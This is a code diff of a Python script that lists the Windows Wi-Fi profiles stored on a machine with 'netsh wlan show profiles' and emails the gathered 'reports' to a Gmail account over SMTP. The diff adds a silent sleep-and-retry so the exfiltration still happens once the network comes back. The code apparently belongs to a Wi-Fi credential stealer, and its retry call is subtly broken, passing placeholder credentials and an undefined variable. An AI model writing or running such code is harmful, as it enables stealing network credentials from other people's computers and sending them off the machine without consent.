@@ -1,14 +1,18 @@
 #!/usr/bin/env python                                     #Ye pata nahi kyu likha h
 
-import subprocess, smtplib, re              
+import subprocess, smtplib, re, time              
 
 
 def send_mail(email, password, message):                  #function for sending email to yourself
-    server = smtplib.SMTP("smtp.gmail.com",587)           #setting up the smtp server at default port for TLS ie. 587
-    server.starttls()
-    server.login(email, password,)
-    server.sendmail(email, email, message)                # can change sender or receivers address
-    server.quit()
+    try:
+        server = smtplib.SMTP("smtp.gmail.com",587)           #setting up the smtp server at default port for TLS ie. 587
+        server.starttls()
+        server.login(email, password,)
+        server.sendmail(email, email, message)                # can change sender or receivers address
+        server.quit()
+    except:
+        time.sleep(10)                                         # Delay(Basically hoping that internet turns on)
+        send_mail("<YOUR_EMAIL>", "<YOUR_PASSWORD>", result)      # function call to send the reports
 
 command = "netsh wlan show profiles"                      # To show the names of all Wlan profiles stored
 networks = subprocess.check_output(command, shell=True).decode('utf-8')  #.decode('utf-8') used to change its form, if not done, it returns error "that output is not a string type"
